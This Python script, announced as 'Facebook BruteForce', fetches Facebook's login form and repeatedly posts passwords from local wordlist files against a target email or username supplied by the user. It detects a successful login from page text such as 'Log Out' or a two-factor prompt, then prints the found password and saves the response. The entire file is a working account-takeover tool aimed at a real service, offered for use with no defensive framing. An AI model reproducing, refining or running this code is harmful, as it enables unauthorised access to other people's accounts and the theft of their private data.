import os
import requests
from bs4 import BeautifulSoup
import sys

if sys.version_info[0] != 3:
    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
    fb.py\n\t--------------------------------------''')
    sys.exit()

MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}


def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies


def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        print('\npassword found is: ', password)
        return True
    return False


if __name__ == "__main__":
    print('\n---------- Welcome To Facebook BruteForce ----------\n')

    # Get a list of all txt files in the current directory
    txt_files = [file for file in os.listdir() if file.endswith(".txt")]

    if not txt_files:
        print("No txt files found in the current directory.")
        sys.exit(0)

    # Display the list of txt files
    print("Available password files:")
    for i, file in enumerate(txt_files, start=1):
        print(f"{i}. {file}")

    # Ask the user to select files
    choice = input("\nEnter the numbers corresponding to the password files to use (comma-separated or 'all' for all): ")

    if choice.lower() == 'all':
        PASSWORD_FILES = txt_files
    else:
        try:
            choices = [int(i.strip()) for i in choice.split(',')]
            PASSWORD_FILES = [txt_files[i - 1] for i in choices]
        except (ValueError, IndexError):
            print("Invalid choice.")
            sys.exit(0)

    print("Password files selected: ", PASSWORD_FILES)

    email = input('Enter Email/Username to target: ').strip()

    for PASSWORD_FILE in PASSWORD_FILES:
        print(f"\nUsing password file: {PASSWORD_FILE}")
        # Read the chosen password file
        password_data = open(PASSWORD_FILE, 'r').read().split("\n")

        for index, password in zip(range(password_data.__len__()), password_data):
            password = password.strip()
            if len(password) < MIN_PASSWORD_LENGTH:
                continue
            print("Trying password [", index, "]: ", password)
            if is_this_a_password(email, index, password):
                sys.exit(0)
